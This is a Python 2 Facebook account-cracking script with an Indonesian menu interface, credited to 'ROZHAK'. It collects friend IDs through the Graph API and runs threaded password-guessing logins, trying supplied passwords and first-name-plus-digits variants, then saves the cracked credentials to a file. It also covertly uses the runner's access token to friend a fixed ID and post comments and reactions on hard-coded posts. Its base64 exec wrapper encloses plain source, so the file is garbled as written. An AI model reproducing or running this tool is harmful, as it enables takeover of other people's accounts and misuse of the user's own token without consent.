# Author : ROZHAK
# Github : https://github.com/Rozak-bot
import base64
exec(base64.b64decode('#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
from datetime import datetime
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 Crack.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "[!] Exit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		
#########LOGO#########
logo = """\033[31;1m  ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗
\033[31;1m ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
\033[31;1m ██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
\033[31;1m ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
\033[31;1m ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
                    \033[0;32m Author  : ROZHAK"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m Sedang Masuk\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []

######MASUK######
def masuk():
	os.system('clear')
	print logo
        print ""
        print 59*"\033[0;32m═"
        print "\033[1;33m {01} LOGIN MENGGUNAKAN TOKEN"
        print "\033[1;33m {00} KELUAR"
        print 59*"\033[0;32m═"
        print ""
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[0;32m PILIH :\033[1;97m ")
	if msuk =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m] ISI YANG BENAR!"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		tokenz()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] ISI YANG BENAR!"
		pilih_masuk()
		
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
        print ""
	print 59* "\033[0;32m═"
	toket = raw_input("\033[0;32mMASUKAN TOKEN : \33[31;1m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		jalan ('\033[1;97mSUBSCRIBE DULU BRO !!!')
		os.system('xdg-open  https://www.youtube.com/RozhakID')
		bot_komen()
	except KeyError:
		print "\033[1;97m[\033[1;39m!\033[1;97m] \033[1;39mToken Salah !"
		time.sleep(1)
		masuk()

######BOT KOMEN#######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;39m[!] TOKEN INVALID !"
		os.system('rm -rf login.txt')
	una = ('757953543')
	kom = ('I love you @[757953543:]')
	reac = ('LOVE')
	post = ('10158795312888544')
	post2 = ('10158807643598544')
	kom2 = ('Mantap Bro 😍')
	reac2 = ('LOVE')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()

######MENU#######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=' +toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ttl = a['birthday']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mTOKEN INVALID !"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] TIDAK ADA KONEKSI !"
		keluar()
	os.system("clear")
	print logo
	print 59*"\033[0;32m═"
	print "\033[1;96m [\033[1;97m•\033[1;96m]\033[1;93m NAMA \033[1;91m: \033[31;1m"+nama+"\033[31;1m                  "
	print "\033[1;96m [\033[1;97m•\033[1;96m]\033[1;93m ID   \033[1;91m: \033[31;1m"+id+"\x1b[31;1m              "
	print "\033[1;96m [\033[1;97m•\033[1;96m]\033[1;93m TTL \033[1;91m : \033[31;1m"+ttl
	print 59*"\033[0;32m═"
	print "\x1b[1;33m {1} CRACK AKUN FACEBOOK"
	print "\x1b[1;33m {0} KELUAR"
	print 59*"\033[0;32m═"
        pilih()


def pilih():
	unikers = raw_input("\n\033[0;32mPILIH : \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mISI YANG BENAR! "
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		os.system('clear')
		jalan('MENGHAPUS TOKEN !!! ')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mISI YANG BENAR!"
		pilih()
		
		
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mTOKEN INVALID !!!"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
        print ""
	print 59*"\033[0;32m═"
	print "\x1b[1;33m {1} CRACK DAFTAR TEMAN"
	print "\x1b[1;33m {2} CRACK ID PUBLIK"
	print "\x1b[1;33m {0} KEMBALI"
	print 59*"\033[0;32m═"
        pilih_super()

def pilih_super():
	peak = raw_input("\033[0;32m PILIH\033[0;32m : \033[32;1m")
        if peak =="":
                print "\033[1;97m[!] \x1b[1;97mISI DENGAN BENAR !!!"
                pilih_passxd()
        elif peak =="1" or peak =="01":
                os.system('clear')
                print logo
                print ""
                print 59*"\033[0;32m═"
                jalan('\033[30;1m{\033[31;1m•\033[30;1m} \033[0;32mMENGAMBIL ID \033[37;1m...')
                r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
                z = json.loads(r.text)
                for s in z['data']:
                        id.append(s['id'])
        elif peak =="2" or peak =="02":
                os.system('clear')
                print logo
                print ""
                print 59*"\033[0;32m═"
                idt = raw_input("\033[33;1m{\033[31;1m•\033[33;1m} \033[0;32mMASUKAN ID PUBLIK \033[0;32m:\033[32;1m ")
                try:
                        pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
                        sp = json.loads(pok.text)
                        print"\033[33;1m{\033[31;1m•\033[33;1m}\033[0;32m NAMA \033[0;32m:\033[32;1m "+sp["name"]
                except KeyError:
                        print"\033[31;1m[\033[31;1m!\033[31;1m] ID TIDAK DI TEMUKAN !!!"
                        raw_input("\n\033[31;1m[\033[31;1mKEMBALI\033[31;1m]")
                        menu()
                except requests.exceptions.ConnectionError:
                        print"\033[31;1m{\033[31;1m!\033[31;1m} TIDAK ADA KONEKSI !!!"
                        keluar()
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
                z = json.loads(r.text)
                for i in z['data']:
                        id.append(i['id'])
        elif peak =="0" or peak =="00":
                menu()
        else:
                print "\033[31;1m{!} ISI DENGAN BENAR !!!"
                passchoice()

        print "\033[33;1m{\033[31;1m•\033[33;1m} \033[0;32mTOTAL ID \033[0;32m: \033[32;1m"+str(len(id))
        pass1 = raw_input ("\033[0;32m{\033[31;1m♥\033[0;32m} \033[31;1mPASSWORD 1  \033[31;1m:\033[32;1m ")
        pass2 = raw_input ("\033[0;32m{\033[31;1m♥\033[0;32m} \033[31;1mPASSWORD 2  \033[31;1m:\033[32;1m ")
        pass3 = raw_input ("\033[0;32m{\033[31;1m♥\033[0;32m} \033[31;1mPASSWORD 3  \033[31;1m:\033[32;1m ")
        print 59*"\033[0;32m═"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
			rex = requests.post("https://free.facebook.com/login.php", data = {"email" : user, "pass" : pass1, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\033[0;32m[Berhasil]\033[0;32m '+user+' \033[0;32m||\033[0;32m'+pass1
				oke = open('out/Crack.txt', 'a')
				oke.write('\n[Berhasil] '+user+' || '+pass1)
				oke.close()
				oks.append(user)
			else :
				if 'checkpoint' in xo:
					print '\033[1;33m[Chekpoint]\033[1;33m '+user+' \033[1;33m||\033[1;33m '+pass1
					cek = open('out/Crack.txt', 'a')
					cek.write('\n[Chekpoint] '+user+' || '+pass1)
					cek.close()
					cekpoint.append(user)
				else :
					rex = requests.post("https://free.facebook.com/login.php", data = {"userail" : user, "pass" : pass2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[0;32m[Berhasil]\033[0;32m '+user+' \033[0;32m||\033[0;32m'+pass2
						oke = open('out/Crack.txt', 'a')
						oke.write('\n[Berhasil] '+user+' || '+pass2)
						oke.close()
						oks.append(user)
					else :
						if 'checkpoint' in xo:
							print '\033[1;33m[Chekpoint]\033[1;33m '+user+' \033[1;33m||\033[1;33m '+pass2
							cek = open('out/Crack.txt', 'a')
							cek.write('\n[Chekpoint] '+user+' || '+pass2)
							cek.close()
							cekpoint.append(user)
						else :
							rex = requests.post("https://free.facebook.com/login.php", data = {"userail" : user, "pass" : pass3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[0;32m[Berhasil]\033[0;32m '+user+' \033[0;32m|\033[0;32m'+pass3
								oke = open('out/Crack.txt', 'a')
								oke.write('\n[Berhasil] '+user+' || '+pass3)
								oke.close()
								oks.append(user)
			 				else:
								if 'checkpoint' in xo:
										print '\033[1;33m[Chekpoint]\033[1;33m '+user+' \033[1;33m||\033[1;33m '+pass3
										cek = open('out/Crack.txt', 'a')
										cek.write('\n[Chekpoint] '+user+' || '+pass3)
										cek.close()
										cekpoint.append(user)
								else :
									pass4 = c['first_name']+'123'
									rex = requests.post("https://free.facebook.com/login.php", data = {"userail" : user, "pass" : pass4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
						 				print '\033[0;32m[Berhasil]\033[0;32m '+user+' \033[0;32m||\033[0;32m'+pass4
										oke = open('out/Crack.txt', 'a')
										oke.write('\n[Berhasil] '+user+' || '+pass4)
										oke.close()
										oks.append(user)
		  							else:
										if 'checkpoint' in xo:
							 		 		print '\033[1;33m[Chekpoint]\033[1;33m '+user+' \033[1;33m||\033[1;33m '+pass4
											cek = open('out/Crack.txt', 'a')
											cek.write('\n[Chekpoint] '+user+' || '+pass4)
											cek.close()
											cekpoint.append(user)
										else :
											pass5 = c['first_name']+'1234'
											rex = requests.post("https://free.facebook.com/login.php", data = {"userail" : user, "pass" : pass5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
											xo = rex.content
											if 'mbasic_logout_button' in xo or 'save-device' in xo:
												print '\033[0;32m[Berhasil]\033[0;32m '+user+' \033[0;32m|\033[0;32m'+pass5
												oke = open('out/Crack.txt', 'a')
												oke.write('\n[Berhasil] '+user+' || '+pass5)
												oke.close()
												oks.append(user)
			 								else:
												if 'checkpoint' in xo:
													print '\033[1;33m[Chekpoint]\033[1;33m '+user+' \033[1;33m||\033[1;33m '+pass5
													cek = open('out/Crack.txt', 'a')
													cek.write('\n[Chekpoint] '+user+' || '+pass5)
													cek.close()
													cekpoint.append(user)
												else :
													pass6 = c['first_name']+'12345'
													rex = requests.post("https://free.facebook.com/login.php", data = {"userail" : user, "pass" : pass6, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
													xo = rex.content
													if 'mbasic_logout_button' in xo or 'save-device' in xo:
										 				print '\033[0;32m[Berhasil]\033[0;32m '+user+' \033[0;32m||\033[0;32m'+pass6
														oke = open('out/Crack.txt', 'a')
														oke.write('\n[Berhasil] '+user+' || '+pass6)
														oke.close()
														oks.append(user)
		  											else:
														if 'checkpoint' in xo:
											 		 		print '\033[1;33m[Chekpoint]\033[1;33m '+user+' \033[1;33m||\033[1;33m '+pass6
															cek = open('out/Crack.txt', 'a')
															cek.write('\n[Chekpoint] '+user+' || '+pass6)
															cek.close()
															cekpoint.append(user)
							
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
        print ""
        print 59*"\033[0;32m═"
	print '\033[1;96m{\033[1;97m•\033[1;96m} \033[1;92mSELESAI \033[1;97m....'
	print"\033[1;96m{•} \033[1;92mTOTAL OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m{•} \033[1;92mFILE TERSIMPAN \033[1;91m: \033[1;97mout/Crack.txt")
	print 59*"\033[0;32m═"
        raw_input("\n\033[1;96m[\033[1;97mKEMBALI\033[1;96m]")
	super()
	menu()
	
       
		
if __name__=='__main__':
        menu()
        masuk()
'))
